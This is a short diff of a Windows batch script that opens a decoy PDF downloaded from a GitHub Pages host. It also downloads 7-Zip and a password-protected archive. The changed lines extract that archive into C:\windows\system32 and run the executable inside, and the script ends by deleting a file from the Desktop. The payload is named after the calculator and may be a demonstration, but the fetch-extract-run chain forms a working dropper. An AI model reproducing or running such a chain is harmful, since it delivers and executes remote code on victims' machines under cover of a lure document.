@@ -2,11 +2,11 @@
 curl https://kingdog2.github.io/test.pdf -o "%USERPROFILE%\Desktop\test.pdf"
 rundll32 url.dll,FileProtocolHandler file:///%USERPROFILE%\Desktop\test.pdf
 
-curl https://kingdog2.github.io/7z.exe -o "%USERPROFILE%\Desktop\7z.exe"
-curl https://kingdog2.github.io/7z.dll -o "%USERPROFILE%\Desktop\7z.dll"
-curl https://kingdog2.github.io/calc-09163104.7z -o "%USERPROFILE%\calc-09163104.7z"
+curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
+curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
+curl https://kingdog2.github.io/calc_a.7z -o "%TEMP%\calc_a.7z"
 
-%USERPROFILE%\Desktop\7z.exe x %USERPROFILE%\calc-09163104.7z -p7777777 -o%USERPROFILE%
-%USERPROFILE%\calc-09163104.exe
+%TEMP%\7z.exe x %TEMP%\calc_a.7z -p7777777 -o "C:\windows\system32"
+C:\windows\system32\calc_a.exe
 
 del /f %USERPROFILE%\Desktop\A.txt
